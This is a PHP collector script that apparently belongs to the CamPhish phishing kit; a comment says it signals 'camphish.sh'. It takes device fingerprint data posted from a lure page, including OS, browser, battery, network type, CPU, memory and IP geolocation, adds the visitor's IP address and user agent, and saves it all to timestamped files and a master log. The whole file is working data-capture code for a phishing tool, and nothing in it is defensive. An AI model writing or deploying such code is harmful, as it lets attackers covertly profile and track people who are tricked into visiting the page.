<?php
$date = date('dMYHis');

// ── Collect all posted device fields ─────────────────────────────────────────
$fields = [
    'os'          => 'OS',
    'browser'     => 'Browser',
    'language'    => 'Language',
    'timezone'    => 'Timezone',
    'screen_w'    => 'Screen Width',
    'screen_h'    => 'Screen Height',
    'pixel_ratio' => 'Pixel Ratio',
    'orientation' => 'Orientation',
    'battery'     => 'Battery Level',
    'network'     => 'Network Type',
    'platform'    => 'Platform',
    'cores'       => 'CPU Cores',
    'memory'      => 'Device Memory (GB)',
    'touch'       => 'Touch Points',
    'ip_geo'      => 'IP Geolocation (fallback)',
];

$data  = "=== Device Fingerprint ===\r\n";
$data .= "Date: " . $date . "\r\n";
$data .= "IP: " . ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\r\n";
$data .= "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\r\n";
$data .= str_repeat('-', 40) . "\r\n";

foreach ($fields as $key => $label) {
    $val = isset($_POST[$key]) ? htmlspecialchars(strip_tags($_POST[$key])) : 'Not available';
    $data .= "$label: $val\r\n";
}
$data .= str_repeat('=', 40) . "\r\n\r\n";

// ── Save to file ──────────────────────────────────────────────────────────────
$file     = 'device_' . $date . '.txt';
$masterFile = 'saved_device_info.txt';

file_put_contents($file, $data);

if (!file_exists($masterFile)) touch($masterFile);
file_put_contents($masterFile, $data, FILE_APPEND);

// Also write a signal file so camphish.sh can detect & display it
file_put_contents('DeviceInfo.log', "Device info captured\n", FILE_APPEND);

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
?>
